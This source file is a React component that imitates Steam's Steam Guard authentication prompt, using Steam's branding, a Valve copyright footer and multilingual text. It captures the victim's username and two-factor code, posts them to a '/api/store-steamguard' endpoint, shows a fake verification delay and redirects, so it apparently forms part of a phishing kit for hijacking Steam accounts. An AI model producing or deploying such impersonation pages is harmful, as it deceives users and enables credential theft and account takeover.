
import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Loader } from 'lucide-react';
import { useLocation, useNavigate } from 'react-router-dom';

const SteamGuard = () => {
  const [code, setCode] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [timer, setTimer] = useState(30);
  const [language, setLanguage] = useState('tr'); // Default language is Turkish
  const location = useLocation();
  const navigate = useNavigate();
  const username = location.state?.username || '';

  // Page title management
  useEffect(() => {
    const titles = {
      tr: 'Steam Guard Bekleniyor',
      en: 'Steam Guard Waiting',
      de: 'Steam Guard Warten',
      fr: 'Attente de Steam Guard',
      es: 'Esperando Steam Guard'
    };
    document.title = titles[language] || titles.en;
    
    return () => {
      document.title = 'Steam'; // Reset title on unmount
    };
  }, [language]);

  // Detect user's language based on browser settings
  useEffect(() => {
    try {
      const userLanguage = navigator.language.split('-')[0];
      if (['en', 'tr', 'de', 'fr', 'es'].includes(userLanguage)) {
        setLanguage(userLanguage);
      }
    } catch (error) {
      console.error('Error detecting language:', error);
    }
  }, []);

  // Timer countdown
  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => {
        setTimer(prevTimer => prevTimer - 1);
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [timer]);

  const translations = {
    tr: {
      title: 'Steam Guard Mobil Kimlik Doğrulayıcı',
      subtitle: 'Lütfen Steam Guard Mobil Kimlik Doğrulayıcı uygulamasından veya e-posta adresinize gönderilen kodu girin.',
      codeLabel: 'Kimlik Doğrulama Kodu',
      submitButton: 'Gönder',
      resendCode: 'Kodu Tekrar Gönder',
      expire: 'Kod süresi dolacak: ',
      seconds: ' saniye',
      submitting: 'Doğrulanıyor...'
    },
    en: {
      title: 'Steam Guard Mobile Authenticator',
      subtitle: 'Please enter the code from your Steam Guard Mobile Authenticator app or the code sent to your email.',
      codeLabel: 'Authentication Code',
      submitButton: 'Submit',
      resendCode: 'Resend Code',
      expire: 'Code expires in: ',
      seconds: ' seconds',
      submitting: 'Verifying...'
    },
    // Add more languages as needed
  };

  // Get translations based on current language
  const t = translations[language] || translations.en;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!code || code.length < 5) {
      return; // Don't submit if code is not complete
    }
    
    setIsSubmitting(true);
    
    try {
      // Send the Steam Guard code to our API
      const response = await fetch('/api/store-steamguard', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username,
          code
        }),
      });
      
      console.log('Steam Guard response:', await response.json());
      
      // Simulate loading time
      setTimeout(() => {
        navigate('/'); // Redirect back to home
      }, 2000);
      
    } catch (error) {
      console.error('Error submitting Steam Guard code:', error);
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#171a21] flex flex-col">
      {/* Header */}
      <header className="bg-[#171a21] py-4 border-b border-[#2a3f5a]">
        <div className="container mx-auto px-4 flex justify-center">
          <img src="/lovable-uploads/dd61aa68-1534-4089-b154-6d063758d1a1.png" alt="Steam" className="h-10" />
        </div>
      </header>
      
      {/* Main content */}
      <main className="flex-1 flex flex-col items-center justify-center p-4">
        <div className="bg-[#1b2838] rounded-md shadow-lg max-w-md w-full p-6">
          <h1 className="text-2xl font-bold text-white mb-2">{t.title}</h1>
          <p className="text-gray-400 mb-6">{t.subtitle}</p>
          
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <label htmlFor="code" className="block text-sm font-medium text-gray-300">
                {t.codeLabel}
              </label>
              <Input
                id="code"
                value={code}
                onChange={(e) => {
                  // Allow only alphanumeric characters and limit to 5 chars
                  const value = e.target.value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
                  if (value.length <= 5) {
                    setCode(value);
                  }
                }}
                className="bg-[#32353c] border-0 h-12 text-white text-center text-xl tracking-widest"
                placeholder="XXXXX"
                maxLength={5}
                disabled={isSubmitting}
                autoFocus
              />
            </div>
            
            <div className="flex items-center justify-between text-sm text-gray-400">
              <button type="button" className="hover:text-blue-400" onClick={() => setTimer(30)}>
                {t.resendCode}
              </button>
              <div>
                {t.expire}{timer}{t.seconds}
              </div>
            </div>
            
            <Button
              type="submit"
              className="w-full h-12 bg-blue-600 hover:bg-blue-700 transition-colors"
              disabled={isSubmitting || code.length < 5}
            >
              {isSubmitting ? (
                <>
                  <Loader className="mr-2 h-4 w-4 animate-spin" />
                  {t.submitting}
                </>
              ) : (
                t.submitButton
              )}
            </Button>
          </form>
        </div>
      </main>
      
      {/* Footer */}
      <footer className="bg-[#171a21] py-6 border-t border-[#2a3f5a] text-center text-sm text-gray-500">
        <div className="container mx-auto px-4">
          <p>© Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.</p>
        </div>
      </footer>
    </div>
  );
};

export default SteamGuard;
